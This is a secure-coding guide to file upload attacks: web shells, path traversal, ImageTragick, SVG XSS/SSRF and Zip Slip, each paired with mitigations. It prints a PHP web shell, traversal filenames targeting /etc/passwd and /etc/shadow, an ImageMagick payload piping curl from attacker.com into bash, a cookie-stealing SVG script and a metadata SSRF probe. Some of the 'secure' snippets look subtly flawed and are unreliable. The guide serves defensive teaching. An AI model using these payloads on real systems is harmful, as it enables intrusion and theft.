# File Upload Security — Attack Patterns and Mitigations

## Attack 1: Malicious File Type Upload (Web Shell)
**Description:** Attacker uploads a server-side script disguised as an image or document. If executed by the server, it gives the attacker remote code execution.
**Real World Example:** A web shell attack on a major healthcare provider allowed attackers to maintain persistent access for 9 months, exfiltrating 4 million patient records.
**STRIDE Category:** Tampering, Elevation of Privilege
**MITRE ATT&CK:** T1505 Server Software Component, T1190 Exploit Public-Facing Application
**Attack Mechanism:** Attacker uploads a PHP web shell named shell.php.jpg. If the server does not validate content type and stores it in a web-accessible directory, visiting the URL executes the shell.
**Attack Example:**
```php
<?php system($_GET['cmd']); ?>
```
Saved as: profile_pic.php
Accessed at: https://example.com/uploads/profile_pic.php?cmd=whoami

**Vulnerable Code:**
```javascript
app.post('/upload', upload.single('file'), async (req, res) => {
    const filename = req.file.originalname; // Trust user-supplied filename
    await fs.rename(req.file.path, './uploads/' + filename);
    res.json({ url: '/uploads/' + filename });
});
```
**Secure Code:**
```javascript
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif'];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

app.post('/upload', upload.single('file'), async (req, res) => {
    // Validate MIME type by reading magic bytes not trusting Content-Type header
    const fileType = await fromBuffer(req.file.buffer);
    if (!ALLOWED_TYPES.includes(fileType.mime)) {
        return res.status(400).json({ error: 'Invalid file type' });
    }
    if (req.file.size > MAX_SIZE) {
        return res.status(400).json({ error: 'File too large' });
    }
    // Generate a random filename — never use user-supplied name
    const ext = fileType.ext;
    const filename = crypto.randomUUID() + '.' + ext;
    await s3.putObject({ Key: filename, Body: req.file.buffer });
    res.json({ url: '/files/' + filename });
});
```
**Mitigation:** Validate file type by reading magic bytes. Generate random filenames. Store uploads outside the web root. Serve files through a separate domain or CDN.

---

## Attack 2: Path Traversal via Filename
**Description:** Attacker crafts a filename containing path traversal sequences to write files to arbitrary locations on the server.
**STRIDE Category:** Tampering, Elevation of Privilege
**MITRE ATT&CK:** T1083 File and Directory Discovery, T1505 Server Software Component
**Attack Mechanism:** Attacker uploads a file with filename ../../etc/cron.d/malicious. Server writes the file outside the intended upload directory.
**Attack Examples:**
```
filename: ../../etc/passwd
filename: ../../../var/www/html/shell.php
filename: ....//....//etc/shadow
```
**Vulnerable Code:**
```javascript
const uploadPath = path.join('./uploads', req.file.originalname);
fs.writeFileSync(uploadPath, req.file.buffer);
```
**Secure Code:**
```javascript
// Sanitize filename — remove any path traversal sequences
const sanitizedName = path.basename(req.file.originalname).replace(/[^a-z0-9.]/gi, '_');
// Better — generate a completely new random filename
const filename = crypto.randomUUID() + path.extname(sanitizedName);
const uploadPath = path.join('./uploads', filename);
// Verify the resolved path stays within the upload directory
if (!uploadPath.startsWith(path.resolve('./uploads'))) {
    return res.status(400).json({ error: 'Invalid filename' });
}
fs.writeFileSync(uploadPath, req.file.buffer);
```
**Mitigation:** Never use user-supplied filenames. Generate random names server-side. Validate that the resolved path stays within the upload directory.

---

## Attack 3: ImageTragick (CVE-2016-3714)
**Description:** Critical vulnerability in ImageMagick image processing library allowing RCE via maliciously crafted image files.
**STRIDE Category:** Tampering, Elevation of Privilege
**MITRE ATT&CK:** T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter
**Attack Mechanism:** Attacker uploads a specially crafted SVG or image file. When ImageMagick processes it for resizing or conversion, it executes embedded shell commands.
**Attack Example:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|curl https://attacker.com/shell.sh|bash")'
pop graphic-context
```
**Mitigation:** Keep ImageMagick updated. Use a policy.xml to disable dangerous coders. Validate file content before processing. Use sandboxed environments for image processing. Consider cloud-based image processing services instead of local ImageMagick.

---

## Attack 4: XML/SVG File Upload for SSRF and XSS
**Description:** SVG files are XML-based and can contain JavaScript and external references. Uploading SVGs can lead to stored XSS and SSRF.
**STRIDE Category:** Information Disclosure, Tampering
**MITRE ATT&CK:** T1059 Command and Scripting Interpreter, T1552 Unsecured Credentials
**Attack Example — SVG XSS:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
</svg>
```
**Attack Example — SVG SSRF:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```
**Mitigation:** Sanitize SVG content before rendering. Do not allow SVG uploads from untrusted users. Serve uploaded files from a separate domain to isolate JavaScript execution context.

---

## Attack 5: Archive File Bombs and Zip Slip
**Description:** Zip Slip allows attackers to extract files to arbitrary locations. Archive bombs (deeply nested zips) cause DoS through decompression.
**Real World Example:** Zip Slip (2018) affected multiple enterprise products including Cisco, Oracle, and numerous open source libraries.
**STRIDE Category:** Tampering, Denial of Service
**MITRE ATT&CK:** T1499 Endpoint Denial of Service, T1505 Server Software Component
**Attack Example — Zip Slip:**
```
Archive contains: ../../etc/cron.d/malicious
Extraction writes to: /etc/cron.d/malicious
```
**Attack Example — Zip Bomb:**
```
42.zip — 42KB compressed, 4.5PB decompressed (nested zips)
```
**Secure Extraction Code:**
```python
import zipfile
import os

def safe_extract(zip_path, extract_path):
    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            member_path = os.path.realpath(os.path.join(extract_path, member))
            # Verify extraction path stays within target directory
            if not member_path.startswith(os.path.realpath(extract_path)):
                raise ValueError(f"Zip Slip detected: {member}")
        zf.extractall(extract_path)
```
**Mitigation:** Validate all paths during extraction. Set size limits before decompression. Check compression ratio. Use secure extraction libraries.

---

## Secure File Upload Architecture

**Storage:**
- Never store uploads in the web root
- Use dedicated object storage like S3 or Azure Blob Storage
- Store uploads in a separate domain or subdomain

**Processing:**
- Validate MIME type using magic bytes not file extension
- Scan uploads with antivirus before processing
- Process images in a sandboxed environment
- Resize and recompress images to strip metadata and embedded content

**Access Control:**
- Generate pre-signed URLs with short TTLs for file access
- Never serve uploads directly from the application server
- Log all upload and download events with user context

**S3 Secure Upload Example:**
```javascript
// Generate pre-signed URL — user uploads directly to S3
const command = new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: `uploads/${userId}/${crypto.randomUUID()}`,
    ContentType: allowedMimeType,
    ContentLengthRange: [1, 5 * 1024 * 1024] // 5MB max
});
const presignedUrl = await getSignedUrl(s3Client, command, { expiresIn: 300 });
```
